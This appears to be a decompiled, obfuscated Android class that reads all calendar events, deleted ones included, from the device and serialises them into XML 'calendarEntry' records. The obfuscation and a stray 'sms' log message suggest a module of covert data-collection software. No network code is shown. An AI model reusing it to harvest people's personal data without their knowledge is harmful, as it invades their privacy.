package com.network.a;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;
import org.xmlpull.v1.XmlSerializer;

public final class a {

    /* renamed from: a  reason: collision with root package name */
    private static final SimpleDateFormat f36a = new SimpleDateFormat("yyyyMMdd'T'HHmm00'Z'");
    private static String b = null;
    private static Double c = null;

    public static Cursor a(ContentResolver contentResolver) {
        return contentResolver.query(a(), new String[]{"title", "dtstart", "dtend", "allDay", "_id", "eventLocation", "description", "deleted"}, null, null, null);
    }

    public static Uri a() {
        String str;
        if (b != null) {
            str = b;
        } else {
            if (b() > 2.1d) {
                b = "content://com.android.calendar/events";
            } else {
                b = "content://calendar/events";
            }
            com.network.android.c.a.a.a("getEventCursor: " + b);
            str = b;
        }
        return Uri.parse(str);
    }

    private static String a(Date date) {
        if (date == null) {
            return "";
        }
        f36a.setTimeZone(TimeZone.getTimeZone("GMT"));
        return f36a.format(date);
    }

    public static void a(ContentResolver contentResolver, Handler handler, Context context) {
        handler.post(new b(contentResolver, context));
    }

    public static void a(Cursor cursor, StringBuffer stringBuffer) {
        boolean z = true;
        String string = cursor.getString(0);
        if (string == null) {
            string = "";
        }
        Date date = new Date(cursor.getLong(1));
        Date date2 = new Date(cursor.getLong(2));
        if (cursor.getString(3).equals("0")) {
            z = false;
        }
        Boolean valueOf = Boolean.valueOf(z);
        String string2 = cursor.getString(5);
        if (string2 == null) {
            string2 = "";
        }
        String string3 = cursor.getString(6);
        if (string3 == null) {
            string3 = "";
        }
        String a2 = a(date);
        String a3 = date2.getTime() == 0 ? a2 : a(date2);
        String replaceAll = string.replaceAll("\n", "\\\\n");
        stringBuffer.append("\r\nBEGIN:VCALENDAR\r\nPRODID:Android\r\nVERSION:2.0\r\nMETHOD:PUBLISH\r\nBEGIN:VEVENT");
        stringBuffer.append("\r\nTITLE:" + replaceAll + "\r\nSUMMARY:" + replaceAll + "\r\nDESCRIPTION:" + string3.replaceAll("\n", "\\\\n") + "\r\nDTSTART:" + a2 + "\r\nDTEND:" + a3 + "\r\nALL-DAY:" + valueOf + "\r\nLOCATION:" + string2.replaceAll("\n", "\\\\n"));
        stringBuffer.append("\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n");
    }

    public static void a(XmlSerializer xmlSerializer, Cursor cursor, StringBuffer stringBuffer, String str) {
        String str2;
        try {
            String string = cursor.getString(4);
            long j = cursor.getLong(1) / 1000;
            a(cursor, stringBuffer);
            if (j > 0) {
                str2 = String.valueOf(j);
            } else {
                str2 = "0";
                com.network.android.c.a.a.a("Bad Calendar: " + cursor.getPosition());
                com.network.android.c.a.a.a(stringBuffer.toString());
            }
            a(xmlSerializer, str, string, stringBuffer.toString(), str2);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("get sms Exception- " + th.getMessage(), th);
        }
    }

    public static void a(XmlSerializer xmlSerializer, String str, String str2, String str3, String str4) {
        xmlSerializer.startTag("", "calendarEntry");
        xmlSerializer.attribute("", "recordId", str2);
        xmlSerializer.attribute("", "timestamp", str4);
        if (str != null) {
            xmlSerializer.attribute("", "updateType", str);
        }
        if (str3 != null) {
            xmlSerializer.cdsect(str3);
        }
        xmlSerializer.endTag("", "calendarEntry");
    }

    public static double b() {
        if (c != null) {
            return c.doubleValue();
        }
        String str = Build.VERSION.RELEASE;
        com.network.android.c.a.a.a("Build.VERSION.RELEASE: " + str);
        Double valueOf = Double.valueOf(Double.parseDouble(str.substring(0, str.indexOf(".") + 2)));
        c = valueOf;
        return valueOf.doubleValue();
    }
}
